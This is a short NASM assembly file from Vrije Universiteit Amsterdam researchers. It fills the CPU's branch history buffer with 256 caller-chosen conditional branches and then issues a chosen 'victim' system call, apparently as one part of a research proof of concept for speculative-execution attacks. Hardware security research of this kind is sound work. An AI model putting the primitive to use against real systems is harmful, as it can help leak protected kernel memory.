; Thursday, September 9th 2021
;
; Enrico Barberis - e.barberis@vu.nl
; Pietro Frigo - p.frigo@vu.nl
; Marius Muench - m.muench@vu.nl
; Herbert Bos - herbertb@cs.vu.nl
; Cristiano Giuffrida - giuffrida@cs.vu.nl
;
; Vrije Universiteit Amsterdam - Amsterdam, The Netherlands

;Must match with main.c MAX_HISTORY_SIZE !
%define MAX_HISTORY_SIZE 256

section .text

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; fill_bhb
; - arg 1 - rdi: ptr to history
; - arg 2 - rsi: syscall nr
; - arg 3 - rdx: syscall arg1
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global fill_bhb
fill_bhb:

    ;Perform 256 conditional branches to fill the BHB
    ;rdi points to an array of 256 bytes that dictates the direction of
    ;all the 256 branches
    %assign i 0
    %rep MAX_HISTORY_SIZE
    movzx   rax, byte [rdi]
    inc     rdi
    cmp     rax, 1
    je      next_%+i
    next_%+i:
    %assign i i+1
    %endrep

    ;Now that the BHB is filled, execute the specified syscall
global victim_syscall
victim_syscall:
    mov     rax, rsi
    mov     rdi, rdx
    syscall

    ret

